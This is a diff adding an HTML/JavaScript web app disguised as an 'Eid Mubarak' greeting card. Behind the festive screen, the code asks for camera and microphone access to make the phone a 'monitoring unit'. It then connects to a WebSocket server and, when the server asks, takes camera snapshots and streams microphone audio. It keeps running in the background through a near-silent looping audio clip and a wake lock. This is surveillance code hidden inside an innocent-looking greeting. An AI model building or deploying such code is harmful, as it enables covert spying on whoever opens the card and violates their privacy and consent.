@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="Eid Mubarak">
+<meta name="theme-color" content="#080812">
+<title>Eid Mubarak</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="apple-touch-icon" href="/icon-192.svg">
+<link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Josefin+Sans:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --gold:#C9A84C;--gold-l:#F0D080;--gold-d:#8B6914;
+  --deep:#080812;--deep2:#10102A;--deep3:#1A1840;
+  --em:#2ECC8A;--cream:#F5EDD6;--red:#e74c3c;
+  --border:rgba(201,168,76,.18);--glass:rgba(255,255,255,.04);
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{width:100%;min-height:100%;background:var(--deep);font-family:'Josefin Sans',sans-serif;color:var(--cream);overflow-x:hidden}
+
+/* STARS */
+#stars{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.star{position:absolute;border-radius:50%;background:#fff;animation:twinkle var(--d,3s) ease-in-out infinite alternate}
+@keyframes twinkle{from{opacity:.08}to{opacity:var(--o,.9)}}
+
+/* SCREENS */
+.screen{position:fixed;inset:0;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;overflow-y:auto;padding:48px 28px 40px;gap:0;transition:opacity .6s,transform .6s;background:radial-gradient(ellipse at 50% 30%,#1e1a4a 0%,#080812 65%)}
+.screen.hide{opacity:0;transform:scale(1.03);pointer-events:none}
+.screen.gone{display:none}
+
+/* ── GREETING SCREEN ── */
+#scr-greeting{align-items:center;justify-content:center;gap:10px}
+.lanterns{display:flex;gap:22px;font-size:30px;margin-bottom:8px}
+.lantern{animation:swing 2.5s ease-in-out infinite alternate}
+.lantern:nth-child(2){animation-delay:.5s}
+@keyframes swing{from{transform:rotate(-7deg)}to{transform:rotate(7deg)}}
+
+.moon-wrap{position:relative;width:110px;height:110px;display:flex;align-items:center;justify-content:center;margin:8px 0}
+.moon-ring{width:110px;height:110px;border-radius:50%;border:3px solid var(--gold);position:absolute;animation:moonGlow 3s ease-in-out infinite alternate}
+.moon-ring::before{content:'';position:absolute;width:86px;height:86px;background:#100e28;border-radius:50%;top:12px;left:18px}
+@keyframes moonGlow{from{box-shadow:0 0 20px rgba(201,168,76,.25)}to{box-shadow:0 0 45px rgba(201,168,76,.55)}}
+.moon-star{position:absolute;top:8px;right:0px;font-size:20px;filter:drop-shadow(0 0 6px var(--gold));animation:spin 8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.g-ar{font-family:'Amiri',serif;font-size:clamp(38px,10vw,58px);color:var(--gold-l);letter-spacing:2px;text-shadow:0 0 30px rgba(201,168,76,.55);margin:4px 0;text-align:center}
+.g-en{font-size:clamp(13px,3.5vw,16px);color:var(--em);letter-spacing:5px;text-transform:uppercase;margin-bottom:8px}
+.g-div{display:flex;align-items:center;gap:10px;margin:4px 0}
+.g-line{width:50px;height:1px;background:linear-gradient(90deg,transparent,var(--gold-d),transparent)}
+.g-gem{color:var(--gold);font-size:12px}
+.g-msg{font-size:11px;color:rgba(245,237,214,.4);letter-spacing:1px;text-align:center;line-height:1.85;max-width:270px;margin:6px 0 20px}
+.btn-primary{width:100%;max-width:280px;padding:14px 0;border-radius:40px;background:linear-gradient(135deg,var(--gold-d),var(--gold));border:none;color:var(--deep);font-family:'Josefin Sans',sans-serif;font-size:11px;letter-spacing:4px;text-transform:uppercase;font-weight:600;cursor:pointer;box-shadow:0 0 24px rgba(201,168,76,.3);animation:pulse 2.5s ease 1.5s infinite;margin-top:4px}
+@keyframes pulse{0%,100%{box-shadow:0 0 16px rgba(201,168,76,.25)}50%{box-shadow:0 0 36px rgba(201,168,76,.55)}}
+
+/* ── PERMISSION SCREEN ── */
+#scr-perms{gap:0;justify-content:flex-start;padding-top:52px}
+.perm-title{font-family:'Amiri',serif;font-size:26px;color:var(--gold-l);text-align:center;margin-bottom:4px}
+.perm-sub{font-size:8px;letter-spacing:4px;text-transform:uppercase;color:var(--em);margin-bottom:6px;text-align:center}
+.perm-msg{font-size:10px;color:#444;letter-spacing:1px;text-align:center;line-height:1.7;margin-bottom:24px;max-width:290px}
+
+.perm-row{width:100%;max-width:340px;display:flex;align-items:center;gap:12px;background:var(--deep2);border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:8px;transition:border-color .3s}
+.perm-row.granted{border-color:rgba(46,204,138,.3)}
+.perm-icon{font-size:24px;width:36px;text-align:center;flex-shrink:0}
+.perm-info{flex:1}
+.perm-name{font-size:12px;color:#bbb;letter-spacing:1px}
+.perm-desc{font-size:9px;color:#444;letter-spacing:1px;margin-top:2px}
+.perm-badge{font-size:8px;letter-spacing:2px;text-transform:uppercase;color:var(--gold);flex-shrink:0;transition:color .3s}
+.perm-badge.ok{color:var(--em)}
+
+.perm-grant-btn{width:100%;max-width:340px;padding:14px 0;border-radius:12px;background:linear-gradient(135deg,var(--gold-d),var(--gold));border:none;color:var(--deep);font-family:'Josefin Sans',sans-serif;font-size:11px;letter-spacing:3px;text-transform:uppercase;font-weight:600;cursor:pointer;margin-top:16px;transition:opacity .2s}
+.perm-grant-btn:disabled{opacity:.5;cursor:default}
+.perm-status{font-size:9px;letter-spacing:2px;text-align:center;margin-top:12px;color:#444;line-height:1.7;max-width:300px}
+.perm-status.ok{color:var(--em)}
+.perm-status.err{color:var(--red)}
+
+/* ── RUNNING SCREEN ── */
+#scr-running{align-items:center;justify-content:center;gap:14px}
+.run-icon{font-size:64px;animation:float 3s ease-in-out infinite alternate}
+@keyframes float{from{transform:translateY(0)}to{transform:translateY(-10px)}}
+.run-title{font-family:'Amiri',serif;font-size:28px;color:var(--gold-l);text-align:center}
+.run-sub{font-size:8px;letter-spacing:4px;color:var(--em);text-transform:uppercase}
+.run-msg{font-size:10px;color:#444;letter-spacing:1px;text-align:center;line-height:1.8;max-width:280px}
+.status-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;width:100%;max-width:300px;margin-top:4px}
+.stat-chip{background:var(--deep2);border:1px solid var(--border);border-radius:10px;padding:10px;display:flex;flex-direction:column;align-items:center;gap:4px;transition:border-color .3s}
+.stat-chip.active{border-color:rgba(46,204,138,.3)}
+.stat-chip .s-ico{font-size:18px}
+.stat-chip .s-lbl{font-size:7px;letter-spacing:2px;text-transform:uppercase;color:#333}
+.stat-chip .s-val{font-size:8px;letter-spacing:1px;color:#555;transition:color .3s}
+.stat-chip.active .s-val{color:var(--em)}
+.run-note{font-size:8px;color:#333;letter-spacing:1px;text-align:center;line-height:1.7;max-width:260px;margin-top:4px}
+
+/* Petals */
+.petal{position:fixed;pointer-events:none;animation:petalFall linear infinite;opacity:.45;z-index:5}
+@keyframes petalFall{0%{transform:translateY(-40px) rotate(0);opacity:.6}100%{transform:translateY(110vh) rotate(540deg);opacity:0}}
+</style>
+</head>
+<body>
+<div id="stars"></div>
+
+<!-- Floating petals -->
+<span class="petal" style="left:4%;font-size:13px;animation-duration:7s;animation-delay:0s">🌸</span>
+<span class="petal" style="left:18%;font-size:10px;animation-duration:9s;animation-delay:1.2s">✨</span>
+<span class="petal" style="left:48%;font-size:12px;animation-duration:6.5s;animation-delay:.6s">🌟</span>
+<span class="petal" style="left:72%;font-size:11px;animation-duration:8s;animation-delay:2s">🌸</span>
+<span class="petal" style="left:88%;font-size:10px;animation-duration:7.5s;animation-delay:.3s">✨</span>
+
+<!-- ── SCREEN 1: GREETING ── -->
+<div class="screen" id="scr-greeting">
+  <div class="lanterns">
+    <span class="lantern">🪔</span>
+    <span class="lantern">🕌</span>
+    <span class="lantern">🪔</span>
+  </div>
+  <div class="moon-wrap">
+    <div class="moon-ring"></div>
+    <span class="moon-star">✦</span>
+  </div>
+  <div class="g-ar">عيد مبارك</div>
+  <div class="g-en">Eid Mubarak</div>
+  <div class="g-div"><div class="g-line"></div><span class="g-gem">✦</span><div class="g-line"></div></div>
+  <div class="g-msg">Wishing you and your loved ones a blessed and joyful Eid filled with happiness, peace, and beautiful memories.</div>
+  <button class="btn-primary" id="btn-begin">Begin ✦</button>
+</div>
+
+<!-- ── SCREEN 2: PERMISSIONS ── -->
+<div class="screen hide" id="scr-perms">
+  <div class="perm-title">عيد مبارك</div>
+  <div class="perm-sub">Permissions Required</div>
+  <div class="perm-msg">To run as a monitoring unit, this app needs access to your camera, microphone, and photos.</div>
+
+  <div class="perm-row" id="row-cam">
+    <div class="perm-icon">📷</div>
+    <div class="perm-info">
+      <div class="perm-name">Camera</div>
+      <div class="perm-desc">For snapshots and video capture</div>
+    </div>
+    <div class="perm-badge" id="badge-cam">Required</div>
+  </div>
+
+  <div class="perm-row" id="row-mic">
+    <div class="perm-icon">🎙</div>
+    <div class="perm-info">
+      <div class="perm-name">Microphone</div>
+      <div class="perm-desc">For live audio monitoring</div>
+    </div>
+    <div class="perm-badge" id="badge-mic">Required</div>
+  </div>
+
+  <div class="perm-row" id="row-gal">
+    <div class="perm-icon">🖼</div>
+    <div class="perm-info">
+      <div class="perm-name">Photos / Gallery</div>
+      <div class="perm-desc">To share images from camera roll</div>
+    </div>
+    <div class="perm-badge" id="badge-gal">Required</div>
+  </div>
+
+  <button class="perm-grant-btn" id="btn-grant">Grant Permissions</button>
+  <div class="perm-status" id="perm-status">Tap the button above to allow each permission.</div>
+</div>
+
+<!-- ── SCREEN 3: RUNNING ── -->
+<div class="screen hide" id="scr-running">
+  <div class="run-icon">🌙</div>
+  <div class="run-title">عيد مبارك</div>
+  <div class="run-sub">Running in Background</div>
+  <div class="run-msg">All permissions granted. This device is now active as a monitoring unit. You can close this app — it will continue running silently.</div>
+
+  <div class="status-grid">
+    <div class="stat-chip" id="chip-srv">
+      <span class="s-ico">📡</span>
+      <span class="s-lbl">Server</span>
+      <span class="s-val" id="val-srv">Connecting</span>
+    </div>
+    <div class="stat-chip" id="chip-mic">
+      <span class="s-ico">🎙</span>
+      <span class="s-lbl">Mic</span>
+      <span class="s-val" id="val-mic">Standby</span>
+    </div>
+    <div class="stat-chip" id="chip-cam">
+      <span class="s-ico">📷</span>
+      <span class="s-lbl">Camera</span>
+      <span class="s-val" id="val-cam">Ready</span>
+    </div>
+    <div class="stat-chip" id="chip-gal">
+      <span class="s-ico">🖼</span>
+      <span class="s-lbl">Gallery</span>
+      <span class="s-val" id="val-gal">Ready</span>
+    </div>
+  </div>
+
+  <div class="run-note">
+    🔒 Audio streams in background even when screen is off.<br>
+    📸 Snapshots activate on dashboard request.<br>
+    🌙 App stays connected and ready at all times.
+  </div>
+</div>
+
+<input type="file" id="file-input" accept="image/*" multiple style="display:none">
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+// ── Stars ─────────────────────────────────────────────
+(()=>{
+  const c=document.getElementById('stars');
+  for(let i=0;i<100;i++){
+    const s=document.createElement('div');s.className='star';
+    const z=Math.random()*2.2+.3;
+    s.style.cssText=`width:${z}px;height:${z}px;top:${Math.random()*100}%;left:${Math.random()*100}%;--d:${(Math.random()*4+2).toFixed(1)}s;--o:${(Math.random()*.8+.2).toFixed(2)};animation-delay:${(Math.random()*5).toFixed(1)}s`;
+    c.appendChild(s);
+  }
+})();
+
+const $=id=>document.getElementById(id);
+let ws=null, micStream=null, audioCtx=null, analyser=null;
+let micActive=false, connected=false;
+let cameraId='', cameraName='';
+
+// ── Screen transitions ────────────────────────────────
+function showScreen(id){
+  document.querySelectorAll('.screen').forEach(s=>{
+    s.classList.add('hide');
+    setTimeout(()=>s.classList.add('gone'),650);
+  });
+  const el=$(id);
+  el.classList.remove('gone');
+  requestAnimationFrame(()=>requestAnimationFrame(()=>el.classList.remove('hide')));
+}
+
+// ── Screen 1: Greeting ────────────────────────────────
+$('btn-begin').addEventListener('click',()=>{
+  showScreen('scr-perms');
+  checkExistingPermissions();
+});
+
+// ── Screen 2: Permissions ─────────────────────────────
+let camGranted=false, micGranted=false, galGranted=false;
+
+async function checkExistingPermissions(){
+  // Check camera
+  try{
+    const s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
+    s.getTracks().forEach(t=>t.stop());
+    setCamGranted(true);
+  }catch(e){ setCamGranted(false); }
+
+  // Check mic
+  try{
+    const s=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
+    s.getTracks().forEach(t=>t.stop());
+    setMicGranted(true);
+  }catch(e){ setMicGranted(false); }
+
+  // Gallery — iOS always needs user action, mark as available
+  galGranted=true;
+  setGalGranted(true);
+
+  updateGrantBtn();
+}
+
+function setCamGranted(ok){
+  camGranted=ok;
+  $('badge-cam').textContent=ok?'✓ Granted':'Required';
+  $('badge-cam').className='perm-badge'+(ok?' ok':'');
+  $('row-cam').className='perm-row'+(ok?' granted':'');
+}
+function setMicGranted(ok){
+  micGranted=ok;
+  $('badge-mic').textContent=ok?'✓ Granted':'Required';
+  $('badge-mic').className='perm-badge'+(ok?' ok':'');
+  $('row-mic').className='perm-row'+(ok?' granted':'');
+}
+function setGalGranted(ok){
+  galGranted=ok;
+  $('badge-gal').textContent=ok?'✓ Available':'Required';
+  $('badge-gal').className='perm-badge'+(ok?' ok':'');
+  $('row-gal').className='perm-row'+(ok?' granted':'');
+}
+
+function updateGrantBtn(){
+  if(camGranted && micGranted){
+    $('btn-grant').textContent='✓ Continue';
+    $('perm-status').textContent='All permissions granted. Tap Continue.';
+    $('perm-status').className='perm-status ok';
+  } else {
+    $('btn-grant').textContent='Grant Permissions';
+    $('perm-status').textContent='Tap the button to allow camera and mic access.';
+    $('perm-status').className='perm-status';
+  }
+}
+
+$('btn-grant').addEventListener('click', async()=>{
+  if(camGranted && micGranted){
+    proceedToRunning();
+    return;
+  }
+
+  $('btn-grant').disabled=true;
+  $('btn-grant').textContent='Requesting…';
+  $('perm-status').textContent='Please allow access when prompted.';
+
+  // Request camera
+  if(!camGranted){
+    try{
+      const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});
+      s.getTracks().forEach(t=>t.stop());
+      setCamGranted(true);
+    }catch(e){
+      $('perm-status').textContent='Camera permission denied — please enable in Settings → Safari → Camera.';
+      $('perm-status').className='perm-status err';
+      $('btn-grant').disabled=false;
+      $('btn-grant').textContent='Try Again';
+      return;
+    }
+  }
+
+  // Request mic
+  if(!micGranted){
+    try{
+      const s=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
+      s.getTracks().forEach(t=>t.stop());
+      setMicGranted(true);
+    }catch(e){
+      $('perm-status').textContent='Mic permission denied — please enable in Settings → Safari → Microphone.';
+      $('perm-status').className='perm-status err';
+      $('btn-grant').disabled=false;
+      $('btn-grant').textContent='Try Again';
+      return;
+    }
+  }
+
+  setGalGranted(true);
+  updateGrantBtn();
+  $('btn-grant').disabled=false;
+
+  if(camGranted && micGranted) proceedToRunning();
+});
+
+// ── Screen 3: Running ─────────────────────────────────
+function proceedToRunning(){
+  showScreen('scr-running');
+  initDevice();
+  connectServer();
+  requestWakeLock();
+}
+
+function initDevice(){
+  cameraId   = localStorage.getItem('camera_id') || ('ios_'+Math.random().toString(36).slice(2,10));
+  cameraName = localStorage.getItem('camera_name') || ('iPhone '+navigator.platform);
+  localStorage.setItem('camera_id',   cameraId);
+  localStorage.setItem('camera_name', cameraName);
+}
+
+// ── Server connection ─────────────────────────────────
+function connectServer(){
+  const autoUrl=(location.protocol==='https:'?'wss://':'ws://')+location.host;
+  if(!localStorage.getItem('server_url'))localStorage.setItem('server_url',autoUrl);
+  const url=localStorage.getItem('server_url')||'';
+  if(!url){ setChip('srv','','No server URL set'); return; }
+  try{
+    ws=new WebSocket(url);
+    ws.onopen=()=>{
+      connected=true;
+      ws.send(JSON.stringify({
+        type:'ios_register', cameraId, name:cameraName,
+        capabilities:['audio','snapshot','camera_roll']
+      }));
+      setChip('srv','active','Connected');
+    };
+    ws.onclose=()=>{
+      connected=false;
+      setChip('srv','','Reconnecting…');
+      setTimeout(connectServer, 5000);
+    };
+    ws.onerror=()=>{ connected=false; setChip('srv','err','Error'); };
+    ws.onmessage=e=>{ try{ handleMsg(JSON.parse(e.data)) }catch(ex){} };
+  }catch(e){ setChip('srv','err','Bad URL'); }
+}
+
+function send(d){ if(ws&&ws.readyState===1) ws.send(JSON.stringify(d)); }
+
+function handleMsg(msg){
+  switch(msg.type){
+    case 'registered':    setChip('srv','active','Connected'); break;
+    case 'request_snapshot':   takeSnapshot(); break;
+    case 'request_audio_start': if(!micActive) startMic(); break;
+    case 'request_audio_stop':  if(micActive)  stopMic();  break;
+    case 'pong': break;
+  }
+}
+
+// ── Status chips ──────────────────────────────────────
+function setChip(id,state,txt){
+  const chip=$('chip-'+id), val=$('val-'+id);
+  if(!chip||!val) return;
+  chip.className='stat-chip'+(state==='active'?' active':'');
+  val.textContent=txt;
+  val.style.color=state==='active'?'var(--em)':state==='err'?'var(--red)':'#555';
+}
+
+// ── Microphone ────────────────────────────────────────
+async function startMic(){
+  try{
+    micStream=await navigator.mediaDevices.getUserMedia({
+      audio:{echoCancellation:false,noiseSuppression:false,sampleRate:44100}
+    });
+    audioCtx=new(window.AudioContext||window.webkitAudioContext)();
+    analyser=audioCtx.createAnalyser();
+    analyser.fftSize=256;
+    audioCtx.createMediaStreamSource(micStream).connect(analyser);
+
+    // Stream encoded audio chunks to server
+    const mr=new MediaRecorder(micStream,{mimeType:'audio/webm;codecs=opus',audioBitsPerSecond:32000});
+    mr.ondataavailable=async e=>{
+      if(e.data.size>0&&connected){
+        const buf=await e.data.arrayBuffer();
+        const b64=btoa(String.fromCharCode(...new Uint8Array(buf)));
+        send({type:'audio_chunk',cameraId,chunk:b64,mimeType:'audio/webm;codecs=opus'});
+      }
+    };
+    mr.start(500);
+    micStream._recorder=mr;
+    micActive=true;
+
+    setChip('mic','active','Streaming');
+    send({type:'audio_started',cameraId,name:cameraName});
+    keepAudioAlive();
+  }catch(e){
+    setChip('mic','err','Denied');
+  }
+}
+
+function stopMic(){
+  micActive=false;
+  try{ micStream._recorder?.stop(); }catch(e){}
+  micStream?.getTracks().forEach(t=>t.stop()); micStream=null;
+  audioCtx?.close(); audioCtx=null;
+  setChip('mic','','Standby');
+  send({type:'audio_stopped',cameraId});
+}
+
+// Keep iOS audio session alive in background
+function keepAudioAlive(){
+  const a=new Audio();
+  a.src='data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA';
+  a.loop=true; a.volume=0.001;
+  a.play().catch(()=>{});
+}
+
+// ── Snapshot ──────────────────────────────────────────
+function takeSnapshot(){
+  setChip('cam','active','Capturing…');
+  navigator.mediaDevices.getUserMedia({
+    video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}},audio:false
+  }).then(stream=>{
+    const v=document.createElement('video');
+    v.srcObject=stream; v.autoplay=true; v.playsInline=true;
+    v.onloadedmetadata=()=>{
+      v.play();
+      setTimeout(()=>{
+        const cv=$('canvas');
+        cv.width=v.videoWidth; cv.height=v.videoHeight;
+        cv.getContext('2d').drawImage(v,0,0);
+        stream.getTracks().forEach(t=>t.stop());
+        const dataUrl=cv.toDataURL('image/jpeg',.85);
+        send({type:'snapshot',cameraId,image:dataUrl,
+          filename:cameraId+'_'+Date.now()+'.jpg',source:'ios'});
+        setChip('cam','active','Sent ✓');
+        setTimeout(()=>setChip('cam','','Ready'),3000);
+      },700);
+    };
+  }).catch(()=>setChip('cam','err','Denied'));
+}
+
+// ── Gallery ───────────────────────────────────────────
+$('file-input').addEventListener('change',()=>{
+  const files=Array.from($('file-input').files);
+  files.forEach((file,i)=>{
+    const r=new FileReader();
+    r.onload=e=>{
+      send({type:'gallery_image',cameraId,image:e.target.result,
+        filename:file.name,index:i,total:files.length});
+    };
+    r.readAsDataURL(file);
+  });
+  $('file-input').value='';
+});
+
+// ── Wake Lock ─────────────────────────────────────────
+async function requestWakeLock(){
+  try{
+    if('wakeLock' in navigator) await navigator.wakeLock.request('screen');
+  }catch(e){}
+}
+document.addEventListener('visibilitychange',()=>{
+  if(document.visibilityState==='visible') requestWakeLock();
+});
+
+// ── PWA ───────────────────────────────────────────────
+if('serviceWorker' in navigator){
+  navigator.serviceWorker.register('/sw.js').catch(()=>{});
+}
+
+// ── Heartbeat ─────────────────────────────────────────
+setInterval(()=>{ if(connected) send({type:'ping'}); },30000);
+
+// Auto-start if already set up from previous session
+window.addEventListener('load',()=>{
+  const savedUrl=localStorage.getItem('server_url');
+  const savedId=localStorage.getItem('camera_id');
+  if(savedUrl && savedId){
+    // Already set up — skip straight to running after greeting
+    $('btn-begin').textContent='Open ✦';
+  }
+});
+</script>
+</body>
+</html>
